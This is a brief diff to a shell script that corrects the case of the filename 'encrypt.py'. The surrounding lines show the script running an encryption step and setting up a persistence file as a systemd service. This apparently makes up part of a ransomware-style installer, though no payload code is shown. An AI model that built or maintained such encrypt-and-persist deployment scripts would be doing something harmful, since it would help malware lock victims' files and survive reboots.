@@ -34,7 +34,7 @@ chmod +x $TARGET_DIR/persistence
 
 # Execute Encrypt.py
 echo "Executing Encrypt.py..."
-python3 Encrypt.py
+python3 encrypt.py
 
 # Create the systemd service file for persistence.py
 echo "Creating systemd service file for $SERVICE_NAME..."
